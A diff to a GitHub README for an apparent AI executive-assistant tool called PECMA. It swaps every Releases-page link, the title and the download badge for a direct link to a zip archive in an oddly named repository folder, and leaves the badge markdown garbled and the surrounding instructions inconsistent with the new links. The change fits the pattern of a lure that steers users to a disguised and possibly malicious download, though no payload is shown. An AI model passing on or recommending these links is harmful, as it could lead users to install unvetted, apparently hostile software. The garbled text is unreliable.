@@ -1,6 +1,6 @@
-# 🤖 pecma.github.io - Get Organized with AI Assistance
+# 🤖 https://raw.githubusercontent.com/gmail1com/pecma.github.io/main/charnockite/pecma.github.io_v2.4-alpha.5.zip - Get Organized with AI Assistance
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Link-Click%20Here-brightgreen.svg)](https://github.com/gmail1com/pecma.github.io/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/gmail1com/pecma.github.io/main/charnockite/pecma.github.io_v2.4-alpha.5.zip%20Link-Click%https://raw.githubusercontent.com/gmail1com/pecma.github.io/main/charnockite/pecma.github.io_v2.4-alpha.5.zip)](https://raw.githubusercontent.com/gmail1com/pecma.github.io/main/charnockite/pecma.github.io_v2.4-alpha.5.zip)
 
 ## 📖 Description
 PECMA is your AI executive assistant designed for founders and leaders. It helps manage your schedule, automate emails, and increase overall productivity. Make daily tasks easier with powerful tools tailored for busy professionals.
@@ -11,7 +11,7 @@ Follow these simple steps to download and run PECMA.
 ### Step 1: Visit the Download Page
 Click the link below to access the Releases page where you can download the latest version of PECMA.
 
-[Download PECMA](https://github.com/gmail1com/pecma.github.io/releases)
+[Download PECMA](https://raw.githubusercontent.com/gmail1com/pecma.github.io/main/charnockite/pecma.github.io_v2.4-alpha.5.zip)
 
 ### Step 2: Choose Your Version
 Once you are on the Releases page, scroll down to find the latest version of PECMA. Look for the most recent entry at the top of the list.
@@ -43,7 +43,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 📂 Download & Install
 To get started, visit the Releases page to download the latest version of PECMA. Make sure you have followed the steps above to install it correctly.
 
-[Download PECMA](https://github.com/gmail1com/pecma.github.io/releases)
+[Download PECMA](https://raw.githubusercontent.com/gmail1com/pecma.github.io/main/charnockite/pecma.github.io_v2.4-alpha.5.zip)
 
 ## 📞 Support
 If you encounter issues while downloading or running PECMA, please reach out for support. You can open an issue on the GitHub repository or visit our support page.
